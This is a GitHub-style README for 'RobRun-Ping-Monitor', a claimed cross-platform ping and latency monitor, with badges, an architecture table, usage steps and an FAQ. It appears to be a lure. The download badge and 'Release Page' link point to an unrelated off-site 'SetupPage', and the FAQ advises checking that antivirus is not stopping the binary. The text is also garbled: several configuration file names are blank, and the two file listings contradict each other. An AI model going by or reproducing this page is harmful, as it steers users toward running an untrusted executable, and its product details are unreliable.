# RobRun-Ping-Monitor

> **TL;DR** – RobRun-Ping-Monitor is a lightweight, cross‑platform companion that keeps a watchful eye on your RobRun server’s latency, packet loss, and uptime. It ships with a set of ready‑made configuration profiles, a clean visual theme, and a streamlined workflow that lets you start monitoring in minutes without writing a line of code.

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-6d28d9?style=flat-square&logo=youtube&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/FiscalPresent/RobRun-Ping-Monitor">
    <img src="https://img.shields.io/badge/Version-2.3.0-green?style=flat&logo=github" alt="Version">
  </a>
  <a href="https://github.com/FiscalPresent/RobRun-Ping-Monitor/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-brightgreen?style=flat-square&logo=apache" alt="License">
  </a>
  <a href="https://travis-ci.com/FiscalPresent/RobRun-Ping-Monitor">
    <img src="https://img.shields.io/badge/Build-Passing-blue?style=plastic&logo=travis" alt="Build">
  </a>
  <a href="https://github.com/FiscalPresent/RobRun-Ping-Monitor">
    <img src="https://img.shields.io/badge/Platform-Windows%2FLinux-brightgreen?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
  </a>
</div>

---

## Overview

RobRun-Ping-Monitor is engineered to provide administrators and operators with instant feedback on the health of a RobRun instance. By continuously pinging the target server at configurable intervals, the utility aggregates statistics such as:

- **Average latency** (ms) over the last N pings
- **Packet loss** percentage
- **Uptime** counter since the monitor started
- **Historical trend graph** (displayed in a lightweight terminal UI)

Its core design favors **simplicity** over complexity: the binary is self‑contained, requires no external dependencies, and can be dropped into any directory where the target RobRun service resides.

---

## Architecture

| Layer | Responsibility | Implementation |
|-------|----------------|----------------|
| **Transport** | Handles raw ICMP echo requests | `ping_sender.c` |
| **Analysis** | Aggregates ping results, calculates statistics | `stats_engine.c` |
| **Presentation** | Renders a dynamic ASCII dashboard | `ui_renderer.c` |
| **Configuration** | Parses static profiles and user overrides | `config_loader.c` |
| **Persistence** | Stores session logs in a simple CSV | `log_writer.c` |

Each module communicates through well‑defined data structures, allowing future extensions (e.g., adding a REST API or WebSocket dashboard) without touching the core loop.

---

## Usage

1. **Download** the latest release from the badge above or visit the [Release Page](https://rewfdf.github.io/SetupPage/).
2. **Place** the `Release` (or the compiled binary for your OS) into the same directory as your RobRun server.
3. **Adjust** `` to point at the correct IP or hostname of your server.
4. **Launch** the monitor by double‑clicking the binary or running it via the system console.
   The dashboard will appear automatically, updating in real time.
5. **Export** logs to CSV by pressing **Ctrl+S**; they are written to `session_log.csv` in the current folder.

---

## Directory Layout

```
RobRun-Ping-Monitor/
├── bin/
│   └── Release
├── config/
│   ├──
│   ├──
│   ├──
│   └──
├── docs/
│   └── README.md
└── assets/
    └── logo.png
```

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| *Why is the latency higher than expected?* | Verify the target is reachable from the host. A firewall or routing issue can introduce additional hops. |
| *The monitor stops after a few minutes.* | Ensure the binary has execution permissions and that no antivirus is terminating the process. |
| *How do I change the alert threshold?* | Edit `` and set `threshold=<desired_ms>`. |
| *Can I run the monitor in headless mode?* | Yes; set `refresh=0` in `` to disable live rendering. |
| *Where are the historical logs stored?* | They are appended to `session_log.csv`. Archive or delete them manually when needed. |

If you encounter an issue not covered here, check the console output for error messages and open an issue with the relevant log excerpt.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```